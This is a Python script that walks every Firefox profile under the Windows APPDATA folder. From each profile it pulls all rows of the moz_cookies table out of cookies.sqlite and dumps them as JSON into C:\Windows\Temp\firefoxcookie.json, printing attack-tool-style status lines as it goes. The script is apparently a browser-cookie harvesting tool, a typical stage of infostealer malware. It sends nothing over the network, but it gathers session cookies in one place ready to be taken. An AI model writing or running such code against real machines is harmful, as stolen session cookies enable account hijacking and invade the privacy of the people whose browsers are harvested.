import os
import sqlite3
import json

ROAMING = os.environ["APPDATA"]
PROFILES = "\\Mozilla\\Firefox\\Profiles"
PWD = os.getcwd()

os.chdir(ROAMING + PROFILES)

def CookiesCount(profile):
    try:
        connection = sqlite3.connect("cookies.sqlite")
        cursor = connection.cursor()

        count_query = cursor.execute("SELECT COUNT(name) FROM moz_cookies").fetchall()
        cookies_count = str(count_query).replace("(", "").replace(",)", "")[1:-1]

        print(f"[+] Successfully retrieved {cookies_count} cookies from profile: {profile}")
    except sqlite3.Error as e:
        print(f"[-] SQLite error: {e}")

def SaveToJSONFile(profile):
    try:
        connection = sqlite3.connect("cookies.sqlite")
        cursor = connection.cursor()

        file_name = os.path.join(r"C:\Windows\Temp\firefoxcookie.json")

        # Query to fetch all columns from moz_cookies
        query = "SELECT * FROM moz_cookies"

        # Fetch all rows and column names
        cursor.execute(query)
        columns = [desc[0] for desc in cursor.description]
        cookies = []

        for row in cursor.fetchall():
            cookies.append(dict(zip(columns, row)))

        with open(file_name, "w") as f:
            json.dump(cookies, f, indent=4)

        CookiesCount(profile)
        print(f"[+] Cookies saved to: {file_name}")

    except sqlite3.Error as e:
        print(f"[-] SQLite error: {e}")
    except IOError as e:
        print(f"[-] File error: {e}")

for profile in os.listdir():
    try:
        profile_path = os.path.join(ROAMING + PROFILES, profile)
        if os.path.isdir(profile_path):
            os.chdir(profile_path)
            if "cookies.sqlite" in os.listdir():
                try:
                    SaveToJSONFile(profile)
                except Exception as e:
                    print(f"[-] Couldn't retrieve cookies for profile: {profile} - Error: {e}")
            else:
                print(f"[-] No cookies.sqlite file found in profile: {profile}")
            os.chdir(ROAMING + PROFILES)
        else:
            print(f"[-] Profile path does not exist: {profile_path}")
    except Exception as e:
        print(f"[-] Error navigating to profile: {profile} - Error: {e}")
